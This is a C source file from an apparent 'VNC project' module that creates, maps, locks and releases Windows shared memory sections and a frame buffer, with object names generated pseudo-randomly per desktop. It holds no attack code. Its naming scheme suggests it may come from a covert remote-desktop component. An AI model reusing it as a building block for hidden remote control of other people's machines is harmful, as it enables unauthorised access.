//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: shared.c
// $Revision: 166 $
// $Date: 2014-02-14 19:47:48 +0400 (Пт, 14 фев 2014) $
// description:
//	Shared section support.

#include "project.h"


//
//	Unmaps shared section, releases it's mutex.
//
VOID VncReleaseSharedSection(PVNC_SHARED_SECTION	pSection)
{

	ASSERT_SHARED_SECTION(pSection);
	ASSERT(pSection->LockCount == 0);

	if ( pSection->pFrameBuffer ){
		UnmapViewOfFile( pSection->pFrameBuffer );
		pSection->pFrameBuffer = NULL;
	}
	if (pSection->hFrameBuffer){
		CloseHandle(pSection->hFrameBuffer);
		pSection->hFrameBuffer = NULL;
	}
	if ( pSection->Data ){
		UnmapViewOfFile( pSection->Data );
		pSection->Data  = NULL;
	}
	if (pSection->hMap){
		CloseHandle(pSection->hMap);
		pSection->hMap = NULL;
	}

	if (pSection->hUpdateEvent){
		CloseHandle(pSection->hUpdateEvent);
		pSection->hUpdateEvent = NULL;
	}

	if ( pSection->hLockMutex ){
		CloseHandle(pSection->hLockMutex );
		pSection->hLockMutex = NULL;
	}
	if ( pSection->hStatusEvent ){
		CloseHandle(pSection->hStatusEvent);
		pSection->hStatusEvent = NULL;
	}
#if _DEBUG
	pSection->Magic = 0;
#endif
}


//
//	Initializes shared mapped section and it's mutex with names based on the specified dektop handle.
//
WINERROR VncInitSharedSection(
	IN HDESK hDesktop,					// Handle to desktop to create shared objects names from
	IN PVNC_SHARED_SECTION pSection,	// Pointer to VNC_SHARED_SECTION structure to initialize
	IN ULONG SharedMemSize, // size of shared memory region
	IN BOOL	bCreateNew					// Specifies if NEW shared section being created
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	ULONG		Seed;
	LPTSTR		SectionName = NULL, MutexName = NULL, EventName = NULL, SharedMemMutex = NULL, SharedMemName = NULL;
	LPTSTR		UpdateEventName = NULL;
	_TCHAR		DesktopName[DESKTOP_NAME_LENGTH];

	do 
	{
#if _DEBUG
		pSection->Magic = SHARED_SECTION_MAGIC;
		pSection->LockCount = 0;
#endif

		if (!GetUserObjectInformation(hDesktop, UOI_NAME, &DesktopName, DESKTOP_NAME_LENGTH * sizeof(_TCHAR), NULL))
			break;

		DbgPrint("Creating VNC shared section for desktop \"%s\"\n", DesktopName);

		Seed = *((PULONG)&DesktopName + 1);

		if (!(SectionName = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(MutexName = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(EventName = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(UpdateEventName = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(SharedMemMutex = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(SharedMemName = GenGuidName(&Seed, szLocal, NULL, TRUE)))
			break;

		if (!(pSection->hStatusEvent = CreateEvent(&g_DefaultSA, TRUE, FALSE, EventName)))
			break;

		if (!(pSection->hUpdateEvent = CreateEvent(&g_DefaultSA, TRUE, FALSE, UpdateEventName)))
			break;

		DbgPrint("Creating VNC shared section mutex \"%s\"\n", MutexName);
		if (!(pSection->hLockMutex = CreateMutex(&g_DefaultSA, FALSE, MutexName)))
			break;

		if (!bCreateNew && (GetLastError() != ERROR_ALREADY_EXISTS))
		{
			Status = ERROR_FILE_NOT_FOUND;
			break;
		}

		if (!(pSection->hMap = CreateFileMapping(INVALID_HANDLE_VALUE, &g_DefaultSA, PAGE_READWRITE, 0, sizeof(VNC_SHARED_DATA), SectionName)))
			break;

		if (!(pSection->Data = (PVNC_SHARED_DATA)MapViewOfFile(pSection->hMap, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, sizeof(VNC_SHARED_DATA))))
			break;

		if ( bCreateNew ){
			// Generating pseudo-random name for the VNC namespace
			FillGuidName(&Seed, (LPTSTR)&pSection->Data->NamespaceName);
			lstrcpy(pSection->Data->DesktopName,DesktopName);

			if (!(pSection->hFrameBuffer = CreateFileMapping(INVALID_HANDLE_VALUE, &g_DefaultSA, PAGE_READWRITE, 0, SharedMemSize, SharedMemName)))
				break;

			if (!(pSection->pFrameBuffer = (PVNC_SHARED_DATA)MapViewOfFile(pSection->hFrameBuffer, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, SharedMemSize)))
				break;
		}else{
			if (!(pSection->hFrameBuffer = OpenFileMapping(FILE_MAP_WRITE | FILE_MAP_READ, 0, SharedMemName)))
				break;

			if (!(pSection->pFrameBuffer = (PVNC_SHARED_DATA)MapViewOfFile(pSection->hFrameBuffer, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0)))
				break;
		}

		pSection->szFrameBufferName = SharedMemName;
		pSection->FrameBufferSize = SharedMemSize;

		Status = NO_ERROR;

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Status != NO_ERROR)
	{
		VncReleaseSharedSection(pSection);

		if (SharedMemName){
			hFree(SharedMemName);
			SharedMemName = NULL;
		}
	}	// if (Status != NO_ERROR)

	if (SharedMemMutex)
		hFree(SharedMemMutex);

	if (MutexName)
		hFree(MutexName);

	if (EventName)
		hFree(EventName);

	if (SectionName)
		hFree(SectionName);

	DbgPrint("Section create status: %u\n", Status);

	return(Status);
}

//
// remaps frame buffer
//
WINERROR VncRemapFrameBuffer(
	IN PVNC_SHARED_SECTION pSection,	// Pointer to VNC_SHARED_SECTION structure to initialize
	IN ULONG SharedMemSize, // size of shared memory region
	IN BOOL	bCreateNew					// Specifies if NEW shared section being created
	)
{
	LPTSTR SharedMemName = pSection->szFrameBufferName;
	WINERROR	Status = ERROR_UNSUCCESSFULL;

	if ( pSection->FrameBufferSize < SharedMemSize ){
		if ( pSection->pFrameBuffer ){
			UnmapViewOfFile( pSection->pFrameBuffer );
			pSection->pFrameBuffer = NULL;
		}
		if (pSection->hFrameBuffer){
			CloseHandle(pSection->hFrameBuffer);
			pSection->hFrameBuffer = NULL;
		}

		do{
			if ( bCreateNew ){
				if (!(pSection->hFrameBuffer = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, SharedMemSize, SharedMemName)))
					break;

				if (!(pSection->pFrameBuffer = (PVNC_SHARED_DATA)MapViewOfFile(pSection->hFrameBuffer, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, SharedMemSize)))
					break;
			}else{
				if (!(pSection->hFrameBuffer = OpenFileMapping(FILE_MAP_WRITE | FILE_MAP_READ, 0, SharedMemName)))
					break;

				if (!(pSection->pFrameBuffer = (PVNC_SHARED_DATA)MapViewOfFile(pSection->hFrameBuffer, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0)))
					break;
			}
			Status = NO_ERROR;

		} while ( FALSE );
	}else{
		Status = NO_ERROR;
	}

	if (Status != NO_ERROR)
	{
		if ( pSection->pFrameBuffer ){
			UnmapViewOfFile( pSection->pFrameBuffer );
			pSection->pFrameBuffer = NULL;
		}
		if (pSection->hFrameBuffer){
			CloseHandle(pSection->hFrameBuffer);
			pSection->hFrameBuffer = NULL;
		}
	}
	return Status;
}


VOID VncNotifySectionUpdate(PVNC_SHARED_SECTION pSection)
{
	SetEvent ( pSection->hUpdateEvent );
	Sleep ( 0 );
	ResetEvent ( pSection->hUpdateEvent );
}

BOOL VncLockSharedSection(PVNC_SHARED_SECTION pSection)
{
	BOOL Ret = FALSE;

	ASSERT_SHARED_SECTION(pSection);

	if (WaitForSingleObject(pSection->hLockMutex, INFINITE) == WAIT_OBJECT_0)
	{
#if _DEBUG
		pSection->LockCount += 1;
#endif
		Ret = TRUE;
	}
	return(Ret);
}


VOID VncUnlockSharedSection(PVNC_SHARED_SECTION pSection)
{
	ASSERT_SHARED_SECTION(pSection);
	ASSERT(pSection->LockCount);

#if _DEBUG
	pSection->LockCount -= 1;
#endif
	ReleaseMutex(pSection->hLockMutex);
}

BOOL VncLockFrameBuffer(PVNC_SHARED_SECTION pSection)
{
	BOOL Ret = FALSE;

	ASSERT_SHARED_SECTION(pSection);

	if (WaitForSingleObject(pSection->hFrameBufferMutex, INFINITE) == WAIT_OBJECT_0)
	{
		Ret = TRUE;
	}
	return(Ret);
}


VOID VncUnlockFrameBuffer(PVNC_SHARED_SECTION pSection)
{
	ASSERT_SHARED_SECTION(pSection);
	ReleaseMutex(pSection->hFrameBufferMutex);
}